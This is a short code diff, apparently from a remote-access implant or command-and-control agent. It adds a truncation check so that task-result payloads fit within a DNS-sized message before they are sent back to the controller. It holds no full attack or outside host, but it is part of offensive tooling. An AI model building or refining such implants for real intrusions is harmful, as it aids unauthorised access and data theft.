@@ -90,6 +90,12 @@ static BOOL SendTaskResult(
 		CopyMemory(payload + sizeof(resultHeader), resultData, resultLength);
 	}
 
+	//if message too large, truncate
+	if (payloadLength > (MAX_MESSAGE_SIZE - DNS_HEADER_SIZE))
+	{
+		SecureZeroMemory(payload + MAX_MESSAGE_SIZE - DNS_HEADER_SIZE, payloadLength - (MAX_MESSAGE_SIZE - DNS_HEADER_SIZE));
+		payloadLength = MAX_MESSAGE_SIZE - DNS_HEADER_SIZE;
+	}
 	success = SendTlvMessage(sock, (USHORT)taskId, MSG_AGENT_POST_RESULT, payloadLength, payload);
 	ImplantHeapFree(payload);
 
